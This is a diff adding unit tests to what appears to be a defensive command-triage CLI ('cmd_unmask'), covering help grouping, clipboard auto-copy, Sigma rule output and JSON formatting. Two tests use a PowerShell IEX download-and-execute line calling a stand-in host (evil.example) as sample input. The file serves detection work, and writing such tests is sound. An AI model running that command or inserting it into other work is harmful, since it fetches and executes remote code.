@@ -10,7 +10,7 @@ import unittest
 from contextlib import redirect_stdout
 from unittest.mock import patch
 
-from cmd_unmask.cli import main as cli_main
+from cmd_unmask.cli import build_parser, main as cli_main
 
 
 class _FakePipeStdin(io.StringIO):
@@ -158,6 +158,71 @@ class TestAutoSiemClipboardAndStdin(unittest.TestCase):
             self.assertEqual(rc, 0)
             data = json.loads(buf.getvalue())
             self.assertEqual(data["original_command"], raw_payload)
+
+
+class TestSmartTriageDefaultsAndGroupedHelp(unittest.TestCase):
+    """Verify auto-copy, auto-Sigma interactive defaults, opt-out flags, JSON purity, and grouped --help."""
+
+    def test_grouped_help_contains_three_sections(self) -> None:
+        help_text = build_parser().format_help()
+        self.assertIn("Common Triage", help_text)
+        self.assertIn("Output & Detection", help_text)
+        self.assertIn("Benchmark & Advanced", help_text)
+
+    def test_interactive_tty_auto_copies_ticket_note_and_no_copy_opts_out(self) -> None:
+        copied: list[str] = []
+        buf1 = io.StringIO()
+        with (
+            patch("cmd_unmask.cli.set_clipboard_text", side_effect=lambda txt: copied.append(txt) or True),
+            redirect_stdout(buf1),
+            patch.object(buf1, "isatty", return_value=True),
+        ):
+            rc1 = cli_main(["-c", "ipconfig /all", "--no-color"])
+        self.assertEqual(rc1, 0)
+        self.assertEqual(len(copied), 1)
+        self.assertIn("[SOC TRIAGE NOTE", copied[0])
+
+        copied.clear()
+        buf2 = io.StringIO()
+        with (
+            patch("cmd_unmask.cli.set_clipboard_text", side_effect=lambda txt: copied.append(txt) or True),
+            redirect_stdout(buf2),
+            patch.object(buf2, "isatty", return_value=True),
+        ):
+            rc2 = cli_main(["-c", "ipconfig /all", "--no-color", "--no-copy"])
+        self.assertEqual(rc2, 0)
+        self.assertEqual(copied, [])
+
+    def test_non_benign_pretty_auto_emits_sigma_and_no_sigma_opts_out(self) -> None:
+        mal_cmd = "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1')"
+        buf1 = io.StringIO()
+        with redirect_stdout(buf1), patch.object(buf1, "isatty", return_value=True):
+            rc1 = cli_main(["-c", mal_cmd, "--no-color", "--no-copy"])
+        self.assertEqual(rc1, 0)
+        self.assertIn("logsource:", buf1.getvalue())
+        self.assertIn("detection:", buf1.getvalue())
+
+        buf2 = io.StringIO()
+        with redirect_stdout(buf2), patch.object(buf2, "isatty", return_value=True):
+            rc2 = cli_main(["-c", mal_cmd, "--no-color", "--no-copy", "--no-sigma"])
+        self.assertEqual(rc2, 0)
+        self.assertNotIn("logsource:", buf2.getvalue())
+
+    def test_json_and_jsonl_stdout_remain_pure(self) -> None:
+        mal_cmd = "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1')"
+        buf_json = io.StringIO()
+        with redirect_stdout(buf_json):
+            rc_json = cli_main(["-c", mal_cmd, "--format", "json"])
+        self.assertEqual(rc_json, 0)
+        parsed = json.loads(buf_json.getvalue())
+        self.assertIn("severity", parsed)
+
+        buf_jsonl = io.StringIO()
+        with redirect_stdout(buf_jsonl):
+            rc_jsonl = cli_main(["-c", mal_cmd, "--format", "jsonl"])
+        self.assertEqual(rc_jsonl, 0)
+        parsed_line = json.loads(buf_jsonl.getvalue().strip())
+        self.assertIn("severity", parsed_line)
 
 
 if __name__ == "__main__":
